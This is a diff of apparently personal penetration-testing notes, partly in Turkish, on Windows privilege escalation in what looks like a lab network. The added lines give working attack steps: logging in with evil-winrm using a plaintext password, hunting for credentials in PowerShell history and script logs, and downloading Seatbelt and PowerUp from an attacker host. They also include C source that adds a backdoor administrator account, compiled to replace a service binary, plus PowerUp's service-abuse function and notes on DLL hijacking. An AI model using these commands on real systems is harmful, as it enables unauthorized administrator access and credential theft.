@@ -126,8 +126,58 @@ convertbase64 windows powershell
 
 Evil-WinRm
 evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"
+
+
+
 Powershell History
 Get-History
 if empty try this 
 (Get-PSReadlineOption).HistorySavePath
 and cat this. 
+4104 event id search for script logging passwords on event viewer -> application -> windows -> powershell -> operational 
+
+iwr -uri http://192.168.45.197/Seatbelt.exe -Outfile seatbelt.exe
+----------------------
+Service Binary Hijacking
+------------------
+Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
+Eğer bir uygulama C:\Windows\System32 altında görünüyorsa servis yüklemiş C:\Uygulama ise kullanıcı yüklemiştir. 
+icacls "C:\xampp\apache\bin\httpd.exe" yetkileri verir F-M-RX-R-W
+Mysqld.exe XAMMP da her zaman otomatik olarak çalıştırılır. C:\xampp\mysql\bin\mysqld.exe
+servis start mode u ne burdan görebilriiz. 
+"
+#include <stdlib.h>
+
+int main ()
+{
+  int i;
+  
+  i = system ("net user dave2 password123! /add");
+  i = system ("net localgroup administrators dave2 /add");
+  
+  return 0;
+}
+"
+x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
+Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
+shutdown /r /t 0
+Get-LocalGroupMember administrators
+------------- get modifiable paths
+cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
+iwr -uri http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1
+powershell -ep bypass
+. .\PowerUp.ps1
+Get-ModifiableServiceFile
+AbuseFunction to add the user john Password123! 
+bu in this situation you need to stop the service abusefunction and start the service then u will see the user john added. 
+
+
+--------dll hijack ---
+Standard DLL search order on current Windows versions
+1. The directory from which the application loaded.
+2. The system directory.
+3. The 16-bit system directory.
+4. The Windows directory. 
+5. The current directory.
+6. The directories that are listed in the PATH environment variable.
+
